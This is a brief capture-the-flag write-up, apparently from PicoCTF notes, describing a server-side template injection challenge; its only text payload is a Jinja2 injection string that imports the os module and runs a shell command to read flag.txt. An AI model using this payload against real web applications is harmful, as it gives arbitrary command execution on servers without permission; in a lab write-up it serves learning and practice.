



To test if the website is vulnerable to an SSTI let's put this playload :

![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260305133002.png)



Now let's find the flag with this a
![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260305132715.png)


```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}
```